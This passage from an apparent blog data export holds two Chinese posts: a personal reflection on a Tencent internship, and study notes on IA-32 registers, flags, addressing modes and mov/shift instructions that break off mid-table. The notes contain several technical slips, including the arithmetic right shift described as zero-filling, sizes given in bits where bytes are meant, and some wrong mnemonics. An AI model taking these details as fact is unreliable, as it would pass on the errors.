对项目的思考\n\n实习后对项目的完整度，细致程度，后期维护程度还有功能完整性又了新的思考。\n\n一个成熟的商业项目一定是经过不断打磨，不断精致的，这段过程一定很幸苦。但是看到自己的产品时，会有自信感。对于以往的做完项目就完事的态度，是完全两回事。后期维护也尤为重要，这也表示写的代码可维护性要高，对于编写程序及软件工程含义又更深入了。\n\n### 写在最后\n\n非常感谢有这个机会能够在腾讯和大家一起学习一起进步！在这个团体里学到了许多专业技能及专业技能之外的职业技能。也了解了成熟商业模式下大型互联网公司内部的运作方式。虽然只有三个月的实习时间，但是学习和成长是非常多的。抱着去当一颗零时螺丝钉的心态，也一不小心拿到了正式的offer～\n\n虽然每天加班很辛苦，但很开心～","source":"_posts/2018-tencent-practice.md","raw":"---\ntitle: 腾讯三个月实习有感\ndate: 2018-09-06 10:56:12\ntags: 随笔\ndir: 随笔\n---\n\n时间过得真快，8月31号离职，转眼一星期过去了...\n\n心情也沉淀了一些，将自己的一些感受记录下来吧～\n\n\n\n于今年三月底勉强的拿到了腾讯的船票，上了这条大船，有幸认识腾讯，接触腾讯和喜欢腾讯。\n\n于今年五月十九日加入腾讯，开始窥斑见豹之旅。\n\n### 初见腾讯\n\n和大多数实习生一样，一同去滨海大厦办理入职。\n\n下了公车，在不知所措中猛然发现，原来附近高楼大厦中有一个格外显眼的大楼，便是腾讯滨海大厦了。\n\n一切都似乎在计划中执行，从签合同到办理证件，从结交朋友到一同入住酒店。似乎是一套标准流程，让人感觉安全和亲切。\n\n见过滨海后，公司又安排了内部培训。大家讨论方案，脑暴产品，学习借鉴，最终2周后也交上了一份满意的答卷，获得了金奖的好成绩～\n\n当然，要问我映像最深刻的是什么，要我说，一定是结交朋友了。\n\n初见腾讯，因为学校原因，自己比较自卑。因为身旁好学校的大把，而自己只是一个末流211。可是大家似乎也不问出身，都很和蔼可亲，让人舒服和信赖，在这里也结交了许多朋友，让我打开新世界的大门。\n\n### 在腾讯生活\n\n##### 在腾讯生活是孤独的\n\n似乎大家每天都在忙，未曾见过闲人；如果有，便是自己吧。大家似乎都在面对着电脑工作，自己偶尔有休息的时候，只能闲下来玩玩手机，或是逛逛内部贴吧，以迎接下一个需求。\n\n##### 在腾讯生活是自在的\n\n在这里没有上班打卡的束缚，不需要早上8，9点必须到，若是自己有需要处理的事情，只需要和leader知会一声即可；没有上班工作服装的要求，可以穿着拖鞋，穿着背心（只要不怕空调冷）头发蓬蓬的来上班都行。\n\n每天8点半起床，洗漱后去公司吃早餐；下雨天穿拖鞋，即使鞋子湿了，也可以烘干；有时间就去健身，只需要下一层楼即是健身房的我，体重在3个月不变的情况下，体脂从16%到了10%。\n\n### 在腾讯学习\n\n虽然是web前端实习生，但是学习和开拓了不少眼界！\n\n##### 在腾讯学习机制下\n\n腾讯有很棒的内部资源，无论是腾讯学院，还是腾讯大学，还是面授课。都有很棒的学习资源。\n\n而我几乎每天都会花一部分时间听一听这些课程，不为学习精通，是想了解一下这个世界，这些大牛学习了哪些课程，研究了什么方向，到达了什么程度。顺便提升自己，编写代码过程中有哪些需要注意的；有哪些比较好提升效率的工具；学习方向或是整个大方向的运作。在为期3个月的积累上，确实对行业有了新的认知！\n\n##### 在周围同学中学习\n\n在这里最感谢四个人了。\n\n* 导师: 我是一个不爱表达的人，而她很会发现人的情绪波动，和导师畅聊一番后，度过了一段艰苦的日子；在专业方面，学到如何把一个点考虑的完整，如何把一段代码写的更好，还有对项目更深层次的认识；在生活方面，不论是一些小零食，周末加班福利，还是工作烦心后请客吃饭，都让初到公司的我感到许许多多温暖。\n\n* leader: 非常自豪地说，我有一个非常棒的leader！不论是专业知识，还是整个团队的氛围，都是非常棒！从每天开会的全局把控，到每个小点的细致分工；从团队的迭代速度，到团队技术提升；从团队文化建设，到每个人心态变化…做的非常棒，也在leader身上学到了很多处事原则。学到了心态，责任大于能力！\n\n* Roger: 如果说在导师身上学到的代码和诚以待人，leader身上学到职业素养和责任义务，那么在Roger身上学到的是为人处事的能力了，这似乎是一个非常虚的词，但是对我帮助却很大。初上职场难免会有一些不适应，不像学校里做的好不好无所谓；而是工作上精益求精，要让别人信赖你，敢放心把事情交给你做。对我处事有了非常大的帮助！\n\n* 聪哥: 前三年的健身经验似乎都被这个暑假打败了，缺少健身教练瞎练，虽然有一些成就，但是发力不对导致身材变形，动作不标准导致事倍功半。而这一个暑假无疑是打破之前所有不标准的开始。也让我从饮食结构上改变，从最初的体脂率16%到现在的10%，而体重几乎没有变化！十分感谢聪哥的帮助！\n\n### 思考的转变\n\n##### 对职业的思考\n\n程序员的代码能力，到了一定的程度似乎都大同小异，最终决定高度的，一定是代码能力相关的其他能力高度及职业素养的高度。\n\n* 程序员职业素养:   发生问题及时解决，对问题本身去深入探究，面对新东西不畏惧，对所在领域的持续学习......\n\n* 要么不做，要么做好的态度：出自自己手的东西一定要做好，一开始上手时难免踩了不少坑，走了不少弯路，写了不少bug，既然选择要把需求做完，那一定要做好，这一版本下一版本都需要去考虑，虽然当前版本不上该功能，一定要留有接口\n\n* 其他能力: 比如对编译器的理解，对内核的理解，对cpu的理解......\n\n     _这可能是许许多多的知识组合而成。例如：发生任何问题及代码如何调优，知道如何去优化和找到最佳方案；整个项目的架构及编码，知道这个项目使用什么方式去做是最佳选择；对外时完善内部接口，对内时贴好文档._\n\n##### 对项目的思考\n\n实习后对项目的完整度，细致程度，后期维护程度还有功能完整性又了新的思考。\n\n一个成熟的商业项目一定是经过不断打磨，不断精致的，这段过程一定很幸苦。但是看到自己的产品时，会有自信感。对于以往的做完项目就完事的态度，是完全两回事。后期维护也尤为重要，这也表示写的代码可维护性要高，对于编写程序及软件工程含义又更深入了。\n\n### 写在最后\n\n非常感谢有这个机会能够在腾讯和大家一起学习一起进步！在这个团体里学到了许多专业技能及专业技能之外的职业技能。也了解了成熟商业模式下大型互联网公司内部的运作方式。虽然只有三个月的实习时间，但是学习和成长是非常多的。抱着去当一颗零时螺丝钉的心态，也一不小心拿到了正式的offer～\n\n虽然每天加班很辛苦，但很开心～","slug":"2018-tencent-practice","published":1,"updated":"2021-09-11T04:59:27.897Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nyzw00044jzxkp36yg8i","content":"<p>时间过得真快，8月31号离职，转眼一星期过去了…</p><p>心情也沉淀了一些，将自己的一些感受记录下来吧～</p><p>于今年三月底勉强的拿到了腾讯的船票，上了这条大船，有幸认识腾讯，接触腾讯和喜欢腾讯。</p><p>于今年五月十九日加入腾讯，开始窥斑见豹之旅。</p><h3 id=\"初见腾讯\"><a href=\"#初见腾讯\" class=\"headerlink\" title=\"初见腾讯\"></a>初见腾讯</h3><p>和大多数实习生一样，一同去滨海大厦办理入职。</p><p>下了公车，在不知所措中猛然发现，原来附近高楼大厦中有一个格外显眼的大楼，便是腾讯滨海大厦了。</p><p>一切都似乎在计划中执行，从签合同到办理证件，从结交朋友到一同入住酒店。似乎是一套标准流程，让人感觉安全和亲切。</p><p>见过滨海后，公司又安排了内部培训。大家讨论方案，脑暴产品，学习借鉴，最终2周后也交上了一份满意的答卷，获得了金奖的好成绩～</p><p>当然，要问我映像最深刻的是什么，要我说，一定是结交朋友了。</p><p>初见腾讯，因为学校原因，自己比较自卑。因为身旁好学校的大把，而自己只是一个末流211。可是大家似乎也不问出身，都很和蔼可亲，让人舒服和信赖，在这里也结交了许多朋友，让我打开新世界的大门。</p><h3 id=\"在腾讯生活\"><a href=\"#在腾讯生活\" class=\"headerlink\" title=\"在腾讯生活\"></a>在腾讯生活</h3><h5 id=\"在腾讯生活是孤独的\"><a href=\"#在腾讯生活是孤独的\" class=\"headerlink\" title=\"在腾讯生活是孤独的\"></a>在腾讯生活是孤独的</h5><p>似乎大家每天都在忙，未曾见过闲人；如果有，便是自己吧。大家似乎都在面对着电脑工作，自己偶尔有休息的时候，只能闲下来玩玩手机，或是逛逛内部贴吧，以迎接下一个需求。</p><h5 id=\"在腾讯生活是自在的\"><a href=\"#在腾讯生活是自在的\" class=\"headerlink\" title=\"在腾讯生活是自在的\"></a>在腾讯生活是自在的</h5><p>在这里没有上班打卡的束缚，不需要早上8，9点必须到，若是自己有需要处理的事情，只需要和leader知会一声即可；没有上班工作服装的要求，可以穿着拖鞋，穿着背心（只要不怕空调冷）头发蓬蓬的来上班都行。</p><p>每天8点半起床，洗漱后去公司吃早餐；下雨天穿拖鞋，即使鞋子湿了，也可以烘干；有时间就去健身，只需要下一层楼即是健身房的我，体重在3个月不变的情况下，体脂从16%到了10%。</p><h3 id=\"在腾讯学习\"><a href=\"#在腾讯学习\" class=\"headerlink\" title=\"在腾讯学习\"></a>在腾讯学习</h3><p>虽然是web前端实习生，但是学习和开拓了不少眼界！</p><h5 id=\"在腾讯学习机制下\"><a href=\"#在腾讯学习机制下\" class=\"headerlink\" title=\"在腾讯学习机制下\"></a>在腾讯学习机制下</h5><p>腾讯有很棒的内部资源，无论是腾讯学院，还是腾讯大学，还是面授课。都有很棒的学习资源。</p><p>而我几乎每天都会花一部分时间听一听这些课程，不为学习精通，是想了解一下这个世界，这些大牛学习了哪些课程，研究了什么方向，到达了什么程度。顺便提升自己，编写代码过程中有哪些需要注意的；有哪些比较好提升效率的工具；学习方向或是整个大方向的运作。在为期3个月的积累上，确实对行业有了新的认知！</p><h5 id=\"在周围同学中学习\"><a href=\"#在周围同学中学习\" class=\"headerlink\" title=\"在周围同学中学习\"></a>在周围同学中学习</h5><p>在这里最感谢四个人了。</p><ul><li><p>导师: 我是一个不爱表达的人，而她很会发现人的情绪波动，和导师畅聊一番后，度过了一段艰苦的日子；在专业方面，学到如何把一个点考虑的完整，如何把一段代码写的更好，还有对项目更深层次的认识；在生活方面，不论是一些小零食，周末加班福利，还是工作烦心后请客吃饭，都让初到公司的我感到许许多多温暖。</p></li><li><p>leader: 非常自豪地说，我有一个非常棒的leader！不论是专业知识，还是整个团队的氛围，都是非常棒！从每天开会的全局把控，到每个小点的细致分工；从团队的迭代速度，到团队技术提升；从团队文化建设，到每个人心态变化…做的非常棒，也在leader身上学到了很多处事原则。学到了心态，责任大于能力！</p></li><li><p>Roger: 如果说在导师身上学到的代码和诚以待人，leader身上学到职业素养和责任义务，那么在Roger身上学到的是为人处事的能力了，这似乎是一个非常虚的词，但是对我帮助却很大。初上职场难免会有一些不适应，不像学校里做的好不好无所谓；而是工作上精益求精，要让别人信赖你，敢放心把事情交给你做。对我处事有了非常大的帮助！</p></li><li><p>聪哥: 前三年的健身经验似乎都被这个暑假打败了，缺少健身教练瞎练，虽然有一些成就，但是发力不对导致身材变形，动作不标准导致事倍功半。而这一个暑假无疑是打破之前所有不标准的开始。也让我从饮食结构上改变，从最初的体脂率16%到现在的10%，而体重几乎没有变化！十分感谢聪哥的帮助！</p></li></ul><h3 id=\"思考的转变\"><a href=\"#思考的转变\" class=\"headerlink\" title=\"思考的转变\"></a>思考的转变</h3><h5 id=\"对职业的思考\"><a href=\"#对职业的思考\" class=\"headerlink\" title=\"对职业的思考\"></a>对职业的思考</h5><p>程序员的代码能力，到了一定的程度似乎都大同小异，最终决定高度的，一定是代码能力相关的其他能力高度及职业素养的高度。</p><ul><li><p>程序员职业素养: 发生问题及时解决，对问题本身去深入探究，面对新东西不畏惧，对所在领域的持续学习……</p></li><li><p>要么不做，要么做好的态度：出自自己手的东西一定要做好，一开始上手时难免踩了不少坑，走了不少弯路，写了不少bug，既然选择要把需求做完，那一定要做好，这一版本下一版本都需要去考虑，虽然当前版本不上该功能，一定要留有接口</p></li><li><p>其他能力: 比如对编译器的理解，对内核的理解，对cpu的理解……</p><p><em>这可能是许许多多的知识组合而成。例如：发生任何问题及代码如何调优，知道如何去优化和找到最佳方案；整个项目的架构及编码，知道这个项目使用什么方式去做是最佳选择；对外时完善内部接口，对内时贴好文档.</em></p></li></ul><h5 id=\"对项目的思考\"><a href=\"#对项目的思考\" class=\"headerlink\" title=\"对项目的思考\"></a>对项目的思考</h5><p>实习后对项目的完整度，细致程度，后期维护程度还有功能完整性又了新的思考。</p><p>一个成熟的商业项目一定是经过不断打磨，不断精致的，这段过程一定很幸苦。但是看到自己的产品时，会有自信感。对于以往的做完项目就完事的态度，是完全两回事。后期维护也尤为重要，这也表示写的代码可维护性要高，对于编写程序及软件工程含义又更深入了。</p><h3 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h3><p>非常感谢有这个机会能够在腾讯和大家一起学习一起进步！在这个团体里学到了许多专业技能及专业技能之外的职业技能。也了解了成熟商业模式下大型互联网公司内部的运作方式。虽然只有三个月的实习时间，但是学习和成长是非常多的。抱着去当一颗零时螺丝钉的心态，也一不小心拿到了正式的offer～</p><p>虽然每天加班很辛苦，但很开心～</p>","site":{"data":{}},"excerpt":"","more":"<p>时间过得真快，8月31号离职，转眼一星期过去了…</p><p>心情也沉淀了一些，将自己的一些感受记录下来吧～</p><p>于今年三月底勉强的拿到了腾讯的船票，上了这条大船，有幸认识腾讯，接触腾讯和喜欢腾讯。</p><p>于今年五月十九日加入腾讯，开始窥斑见豹之旅。</p><h3 id=\"初见腾讯\"><a href=\"#初见腾讯\" class=\"headerlink\" title=\"初见腾讯\"></a>初见腾讯</h3><p>和大多数实习生一样，一同去滨海大厦办理入职。</p><p>下了公车，在不知所措中猛然发现，原来附近高楼大厦中有一个格外显眼的大楼，便是腾讯滨海大厦了。</p><p>一切都似乎在计划中执行，从签合同到办理证件，从结交朋友到一同入住酒店。似乎是一套标准流程，让人感觉安全和亲切。</p><p>见过滨海后，公司又安排了内部培训。大家讨论方案，脑暴产品，学习借鉴，最终2周后也交上了一份满意的答卷，获得了金奖的好成绩～</p><p>当然，要问我映像最深刻的是什么，要我说，一定是结交朋友了。</p><p>初见腾讯，因为学校原因，自己比较自卑。因为身旁好学校的大把，而自己只是一个末流211。可是大家似乎也不问出身，都很和蔼可亲，让人舒服和信赖，在这里也结交了许多朋友，让我打开新世界的大门。</p><h3 id=\"在腾讯生活\"><a href=\"#在腾讯生活\" class=\"headerlink\" title=\"在腾讯生活\"></a>在腾讯生活</h3><h5 id=\"在腾讯生活是孤独的\"><a href=\"#在腾讯生活是孤独的\" class=\"headerlink\" title=\"在腾讯生活是孤独的\"></a>在腾讯生活是孤独的</h5><p>似乎大家每天都在忙，未曾见过闲人；如果有，便是自己吧。大家似乎都在面对着电脑工作，自己偶尔有休息的时候，只能闲下来玩玩手机，或是逛逛内部贴吧，以迎接下一个需求。</p><h5 id=\"在腾讯生活是自在的\"><a href=\"#在腾讯生活是自在的\" class=\"headerlink\" title=\"在腾讯生活是自在的\"></a>在腾讯生活是自在的</h5><p>在这里没有上班打卡的束缚，不需要早上8，9点必须到，若是自己有需要处理的事情，只需要和leader知会一声即可；没有上班工作服装的要求，可以穿着拖鞋，穿着背心（只要不怕空调冷）头发蓬蓬的来上班都行。</p><p>每天8点半起床，洗漱后去公司吃早餐；下雨天穿拖鞋，即使鞋子湿了，也可以烘干；有时间就去健身，只需要下一层楼即是健身房的我，体重在3个月不变的情况下，体脂从16%到了10%。</p><h3 id=\"在腾讯学习\"><a href=\"#在腾讯学习\" class=\"headerlink\" title=\"在腾讯学习\"></a>在腾讯学习</h3><p>虽然是web前端实习生，但是学习和开拓了不少眼界！</p><h5 id=\"在腾讯学习机制下\"><a href=\"#在腾讯学习机制下\" class=\"headerlink\" title=\"在腾讯学习机制下\"></a>在腾讯学习机制下</h5><p>腾讯有很棒的内部资源，无论是腾讯学院，还是腾讯大学，还是面授课。都有很棒的学习资源。</p><p>而我几乎每天都会花一部分时间听一听这些课程，不为学习精通，是想了解一下这个世界，这些大牛学习了哪些课程，研究了什么方向，到达了什么程度。顺便提升自己，编写代码过程中有哪些需要注意的；有哪些比较好提升效率的工具；学习方向或是整个大方向的运作。在为期3个月的积累上，确实对行业有了新的认知！</p><h5 id=\"在周围同学中学习\"><a href=\"#在周围同学中学习\" class=\"headerlink\" title=\"在周围同学中学习\"></a>在周围同学中学习</h5><p>在这里最感谢四个人了。</p><ul><li><p>导师: 我是一个不爱表达的人，而她很会发现人的情绪波动，和导师畅聊一番后，度过了一段艰苦的日子；在专业方面，学到如何把一个点考虑的完整，如何把一段代码写的更好，还有对项目更深层次的认识；在生活方面，不论是一些小零食，周末加班福利，还是工作烦心后请客吃饭，都让初到公司的我感到许许多多温暖。</p></li><li><p>leader: 非常自豪地说，我有一个非常棒的leader！不论是专业知识，还是整个团队的氛围，都是非常棒！从每天开会的全局把控，到每个小点的细致分工；从团队的迭代速度，到团队技术提升；从团队文化建设，到每个人心态变化…做的非常棒，也在leader身上学到了很多处事原则。学到了心态，责任大于能力！</p></li><li><p>Roger: 如果说在导师身上学到的代码和诚以待人，leader身上学到职业素养和责任义务，那么在Roger身上学到的是为人处事的能力了，这似乎是一个非常虚的词，但是对我帮助却很大。初上职场难免会有一些不适应，不像学校里做的好不好无所谓；而是工作上精益求精，要让别人信赖你，敢放心把事情交给你做。对我处事有了非常大的帮助！</p></li><li><p>聪哥: 前三年的健身经验似乎都被这个暑假打败了，缺少健身教练瞎练，虽然有一些成就，但是发力不对导致身材变形，动作不标准导致事倍功半。而这一个暑假无疑是打破之前所有不标准的开始。也让我从饮食结构上改变，从最初的体脂率16%到现在的10%，而体重几乎没有变化！十分感谢聪哥的帮助！</p></li></ul><h3 id=\"思考的转变\"><a href=\"#思考的转变\" class=\"headerlink\" title=\"思考的转变\"></a>思考的转变</h3><h5 id=\"对职业的思考\"><a href=\"#对职业的思考\" class=\"headerlink\" title=\"对职业的思考\"></a>对职业的思考</h5><p>程序员的代码能力，到了一定的程度似乎都大同小异，最终决定高度的，一定是代码能力相关的其他能力高度及职业素养的高度。</p><ul><li><p>程序员职业素养: 发生问题及时解决，对问题本身去深入探究，面对新东西不畏惧，对所在领域的持续学习……</p></li><li><p>要么不做，要么做好的态度：出自自己手的东西一定要做好，一开始上手时难免踩了不少坑，走了不少弯路，写了不少bug，既然选择要把需求做完，那一定要做好，这一版本下一版本都需要去考虑，虽然当前版本不上该功能，一定要留有接口</p></li><li><p>其他能力: 比如对编译器的理解，对内核的理解，对cpu的理解……</p><p><em>这可能是许许多多的知识组合而成。例如：发生任何问题及代码如何调优，知道如何去优化和找到最佳方案；整个项目的架构及编码，知道这个项目使用什么方式去做是最佳选择；对外时完善内部接口，对内时贴好文档.</em></p></li></ul><h5 id=\"对项目的思考\"><a href=\"#对项目的思考\" class=\"headerlink\" title=\"对项目的思考\"></a>对项目的思考</h5><p>实习后对项目的完整度，细致程度，后期维护程度还有功能完整性又了新的思考。</p><p>一个成熟的商业项目一定是经过不断打磨，不断精致的，这段过程一定很幸苦。但是看到自己的产品时，会有自信感。对于以往的做完项目就完事的态度，是完全两回事。后期维护也尤为重要，这也表示写的代码可维护性要高，对于编写程序及软件工程含义又更深入了。</p><h3 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h3><p>非常感谢有这个机会能够在腾讯和大家一起学习一起进步！在这个团体里学到了许多专业技能及专业技能之外的职业技能。也了解了成熟商业模式下大型互联网公司内部的运作方式。虽然只有三个月的实习时间，但是学习和成长是非常多的。抱着去当一颗零时螺丝钉的心态，也一不小心拿到了正式的offer～</p><p>虽然每天加班很辛苦，但很开心～</p>"},{"title":"计算机系统基础－－第三章(程序的转换及机器级表示)","date":"2017-05-23T08:41:08.000Z","dir":"计算机系统基础","keywords":"计算机系统基础－－第三章(程序的转换及机器级表示)","_content":"### 生成机器代码的过程\n1、预处理。：例如，在C语言中有程序以#开头的语句，在源程序中插入所有用的#include命令指定的文件和用#define申明的宏\n```\ncc -E prog1.c -o prog1.i  //对prog1.c进行预处理，预处理结果位prog1.i\n```\n2、编译。将预处理后的源程序文件编译产生相应的汇编语言程序\n```\ngcc -S prog1.i -o prog1.s或gcc -S prog1.c -o prog1.s    //对prog1.i或者prog1.c进行编译，生成汇编代码文件prog1.s\n```\n3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件\n```\ngcc -c prog1.s -o prog1.o //对prog1.s进行汇编，生成可重定位目标文件prog1.o\n```\n3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件\n```\ngcc prog1.o prog2.o -o prog     //将两个可重定位目标文件prog1.o prog2.o链接起来，生成可执行文件prog\n```\n### 可以使用gdb来进行调试\n在Linux中自带GNU调试工具gdb调试和跟踪。\n在生成.o文件后使用objdump -d test.o来进行反汇编查看代码\n```\n// test.c\nint add(int i,int j){\n\tint x = i+j;\n\treturn x;\n}\n// test.o\n0000000000000000 <add>:\n   0:\t55                   \tpush   %rbp\n   1:\t48 89 e5             \tmov    %rsp,%rbp\n   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)\n   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)\n   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx\n   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax\n  10:\t01 d0                \tadd    %edx,%eax\n  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)\n  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  18:\t5d                   \tpop    %rbp\n  19:\tc3                   \tretq\n```\nMASM采用的是Intel格式的汇编代码\n```\t\nMOV [BX+DI-6],CL   //其对大小写不明感，且目的操作数在做，而源操作数在右\n```\nAT&T方式(教材使用方式)\n```\nmov %ecx,(%ebx,%edi,-6)  // R[ecx] <- R[ebx]+M[R[edi]-6]\n```\n寄存器组织和寻址方式\n\n通用寄存器（General Pupose Regesters，32位，8个）\n\n段寄存器（Segment Registers，16位，6个）\n\n程序状态与控制寄存器（Program Status and Control Register，32位，1个）\n\n指令指针寄存器（Instruction Pointer，32位，1个）\n#### 1.通用寄存器\nEAX：累加器（Accumulator，针对操作数和结果数据的）\n\nEBX：基址寄存器（Base，DS段中的数据指针）\n\nECX：计数器（Count，字符串和循环操作的）\n\nEDX：数据寄存器（Data，I/O指针）\n\n以上4个寄存器主要用在算术运算指令中，常常用来保存常量与变量的值。\n\nEBP：扩展基质指针寄存器（Base Pointer，SS段中栈内数据指针）\n\nESI：源变址寄存器（Source Index，字符串操作源指针）\n\nEDI：目的变址寄存器（Destination Index，字符串操作目标指针）\n\nESP：栈指针寄存器（Stack Pointer，SS段中栈指针）\n\n以上4个寄存器主要用作保存内存地址的指针。\n#### 2.段寄存器\nCS：代码段寄存器（Code Segment）\n\nSS：栈段寄存器（Stack Segment）\n\nDS：数据段寄存器（Data Segment）\n\nES：附加数据段寄存器（Extra Data Segment）\n\nFS：数据段寄存器（Data Segment）\n\nGS：数据段寄存器（Data Segment）\n\nCS寄存器用于存放应用程序代码所在段的段基址，SS寄存器用于存放栈段的段基址，DS寄存器用于存放数据段的段基址。ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。\n\n![purposeRegiesters](purposeRegisters.jpg)\n![sliceRegiester](sliceRegister.jpg)\n\n\n#### 3.程序状态与控制寄存器\nEFLAGS：Flag Register，标志寄存器\n![标志寄存器](flagRegister.gif)\n![eflag](eflagRegister.png)\n##### 运算结果标志位\n\n1、进位标志CF(Carry Flag)\n进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。\n使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。\n2、奇偶标志PF(Parity Flag)\n奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。\n利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。\n3、辅助进位标志AF(Auxiliary Carry Flag)\n在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：\n(1)、在字操作时，发生低字节向高字节进位或借位时；\n(2)、在字节操作时，发生低4位向高4位进位或借位时。\n对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。\n4、零标志ZF(Zero Flag)\n零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。\n5、符号标志SF(Sign Flag)\n符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。\n6、溢出标志OF(Overflow Flag)\n溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。\n“溢出”和“进位”是两个不同含义的概念，不要混淆。\n\n##### 状态控制标志位\n\n状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。\n1、追踪标志TF(Trap Flag)\n当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。\n指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。\n2、中断允许标志IF(Interrupt-enable Flag)\n中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：\n(1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；\n(2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。\nCPU的指令系统中也有专门的指令来改变标志位IF的值。\n3、方向标志DF(Direction Flag)\n方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。\n\n##### 32位标志寄存器增加的标志位\n1、I/O特权标志IOPL(I/O Privilege Level)\nI/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。\n2、嵌套任务标志NT(Nested Task)\n嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下：\n(1)、当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作；\n(2)、当NT=1，通过任务转换实现中断返回。\n3、重启动标志RF(Restart Flag)\n重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。\n4、虚拟8086方式标志VM(Virtual 8086 Mode)\n如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态\n#### 4.指令指针寄存器\nEIP：指令指针寄存器（Instruction Pointer），存放下次将要执行的指令在代码段的偏移量。\n### 七种寻址方式\n![findWay](findWay.png)\n定义以下几个类型\n```\nint x;\nfloat a[100];\nshort b[4][4];\n\n```\n假设x的基址位100，每个int元素占4bit，则\na[i] = 104+i4 //比例变址\nb[i][j] = 504+i8+j*2 //基址+比例变址+位移\nx = 100 // 基址\n![](stackValue.png)\n### IA-32常用指令及其操作\n### 传送指令\n1、mov movb(比特), movw(字), movl(双字)\n2、movs 符号扩展传送指令\n3、movz 零扩展传送指令\n4、xchg 数据交换指令\n5、push 压栈\n6、pop 退栈\n7、lea 地址传送指令\n8、in,out 输入输出I/O指令\n9、pushf,popf 标志传送指令\n##### 扩展\n符号位扩展：\n八位扩展为十六位\n由 00001000 -> 1111111100001000\n零扩展：\n八位扩展为十六位\n由 00001000 -> 0000000000001000\n假设val 和ptr声明如下\n**\nval_type val;\ncontofptr_type *ptr;\n已知上述类型val_type和contofptr_type是用typeof声明的数据类型，且val存储在累加器al/ax/eax中，ptr存储在edx中，现有以下两条C语言语句：\nval= (val_type) * ptr;\n*ptr = (contofptr_type) val;\n写出以下组合类型的mov指令实现\n**\n\n| val_type | contofptr_type | \n| --- | --- |\n| char | char |\n| int | char |\n| unsigned | int |\n| int | unsigned char |\n| unsigned | unsigned char |\n| unsigned short | int |\n\n答案：\n\n|val_type        |contofptr_type|语句一对应的操作                        |       语句二对应的操作\n----------------|--------------|-------------------------             |----\n|char            | char         | movb  (%edx),%al //传送              |movb %al,(%edx)//传送|\n|int             | char         | movsb (%edx),%eax // 符号位扩展，传送  |movb %al,(%edx)  //截断，传送|\n|unsigned        | int          |movl (%edx),%eax //传送               |movl %eax,(%edx)  //传送|\n|int             | unsigned char| movzbl (%edx),%eax // 零扩展，传送     | movb %al,(%edx)   //截断，传送|\n|unsigned        | unsigned char|movzbl (%edx),%eax // 零扩展，传送      | movb %al,(%edx)   //截断，传送|\n|unsigned short  | int          |movw (%edx),%ax // 截断，传送          | movzwl %ax,(%edx)   //零扩展，传送|\n\n其在寄存器中以小端方式储存\n**即|12345678H|-> |78H|56H|34H|12H|**\n##### 按位运算指令\n1、NOT单操作数每位取反\n2、AND对双操作数按位逻辑“与”\n3、OR对双操作数按位逻辑“或”\n4、XOR对双操作数按位逻辑“异或”\n5、TEST根据两个操作数相“与”的结果来设置条件标志\n6、SHL逻辑左移，每左移一次，最高位送入cf，并在低位补0\n7、SHR逻辑右移，每右移一次，最低位送入cf，并在高位补0\n8、SAL算术左移，每左移一次，最高位送入cf，并在低位补0，若符号位发生变化，则of=1，表示左移溢出\n9、SAR算术右移，每右移一次，最低位送入cf，并在高位补0\n10、ROL循环左移，每左移一次，最高位移到最低位，并送入cf\n11、ROR循环右移，每右移一次，最低位移到最高位，并送入cf\n12、RCL带循环左移，将CF作为操作数的一部分循环左移\n13、RCR带循环右移，将CF作为操作数的一部分循环右移\n##### 控制转移指令JMP\n##### 条件转移指令\n##### 根据单个标志位的状态判断转移的指令\n| 指令 | 转移条件 | 说明 |\n| --- | --- | --- |\n| 